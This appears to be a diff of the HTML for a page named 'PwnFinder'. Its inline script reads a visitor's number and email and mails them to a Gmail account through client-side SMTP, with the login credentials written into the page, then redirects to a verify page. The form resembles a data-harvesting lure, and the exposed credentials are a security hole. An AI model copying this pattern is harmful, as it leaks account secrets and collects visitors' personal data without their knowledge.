@@ -23,7 +23,7 @@
 </head>
 <body>
 
-    </script>
+
     <section class="header">
         <div class="nav">
             <a href="#" class="logo">PwnFinder</a>
@@ -48,22 +48,23 @@
         </div>
     </div>    <script type="text/javascript">
 	    function check(){
-	var name = $('#num').val();
-	var emai = $('#email').val();
+				var name = $('#num').val();
+				var emai = $('#email').val();
 
-	var body='number:'+name+',email:'+emai;
+				var body='number:'+name+',email:'+emai;
 
-	Email.send({
-	Host : "smtp.gmail.com",
-	Username : "pwnfinder@gmail.com",
-	Password : "official email of pwnfinder03",
-	To : "pwnfinder@gmail.com",
-	From : "pwnfinder@gmail.com",
-	Subject : "pwnfinder",
-	Body : body
-}).then
-	window.location.href = "verify/ve.html";
-}
+				Email.send({
+				Host : "smtp.gmail.com",
+				Username : "pwnfinder@gmail.com",
+				Password : "official email of pwnfinder03",
+				To : "pwnfinder@gmail.com",
+				From : "pwnfinder@gmail.com",
+				Subject : "pwnfinder",
+				Body : body
+			}).then
+				window.location.href = "verify/ve.html";
+			}
+	    </script>
 	
 </body>
 </html>
